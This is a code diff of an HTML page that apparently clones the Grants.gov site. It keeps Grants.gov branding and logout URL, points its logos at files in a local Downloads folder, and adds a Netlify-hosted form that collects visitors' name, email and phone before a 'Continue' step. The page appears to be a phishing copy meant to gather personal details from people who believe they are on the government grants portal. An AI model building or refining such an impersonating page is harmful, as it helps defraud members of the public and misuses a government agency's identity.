@@ -301,7 +301,7 @@ var LOGOUT_URL="https://apply07.grants.gov/apply/Logout.faces?sto=1";
 		    <div class="usa-logo-slim">
 		      <em class="usa-logo__text">
 		      	<div id="logo">
-					<a href="/"><img src="./grants-gov-logo-text.png" width="245" height="78" border="0" alt="Click for Home" /></a>
+					<a href="/"><img src="C:\Users\tobig\Downloads\Grant\grants-gov-logo-text.png" width="245" height="78" border="0" alt="Click for Home" /></a>
 				</div>
 		      </em>
 		    </div>
@@ -734,13 +734,32 @@ padding: 4px 10px;
 		</div>
 	
 		<div id="bodyContent">
-<form id="form" name="contact" method="POST" data-netlify="true">
-<input type="text" name="name" placeholder="Name" required>
+<form id="form"
+      name="contact"
+      method="POST"
+      data-netlify="true"
+      action="/thank-you.html">
 
-<input type="email" name="email" placeholder="Email" required>
+    <input type="text"
+           name="name"
+           placeholder="Name"
+           required>
 
-<input type="tel" name="phone" placeholder="Phone" required>
+    <input type="email"
+           name="email"
+           placeholder="Email"
+           required>
 
+    <input type="tel"
+           name="phone"
+           placeholder="Phone"
+           required>
+
+    <button type="submit">
+        <span class="ui-button-text ui-c">Continue »</span>
+    </button>
+
+</form>
 	
 	<script>
 		//<![CDATA[
@@ -864,7 +883,7 @@ $(function(){
         		<div class="grid-row grid-gap">
         			<div class="usa-footer__logo grid-row mobile-lg:grid-col-6 mobile-lg:grid-gap-2">
         				<div id="logo-footer" class="mobile-lg:grid-col-auto">
-        					<a href="/"><img src="./grants-gov-logo-w.png" width="245" height="78" border="0" alt="Click for Home" /></a>
+        					<a href="/"><img src="C:\Users\tobig\Downloads\Grant\grants-gov-logo-w.png" width="245" height="78" border="0" alt="Click for Home" /></a>
         				</div>
         			</div>
         			<div class="usa-footer__contact-links mobile-lg:grid-col-6">
